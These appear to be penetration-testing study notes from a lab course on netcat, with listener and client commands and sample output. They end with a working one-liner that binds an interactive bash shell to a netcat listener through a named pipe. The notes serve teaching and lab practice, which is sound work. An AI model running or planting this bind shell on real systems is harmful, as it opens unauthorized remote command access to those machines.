![[../assets/Bind Shells/image 187.png|image 187.png]]
  
# GNU Netcat
## Target Starting Netcat Listener
```Markdown
nc -lvnp <port>
```
## Attacker Connecting to Target
```Markdown
nc -nv <IP> <port>
```
## Target Receiving Connection from Client
```Markdown
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```
## Attacker Sending Message
```Markdown
Nathan2112@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```
## Target Receiving Message
```Markdown
Victim@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```
  
  
  
# Establishing a Basic Bind Shell with Netcat
## Server - Binding a Bash Shell to the TCP Session
```Markdown
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> > /tmp/f
```
## Client - Connecting to Bind Shell on Target
```Markdown
nc -nv <IP> <port>
```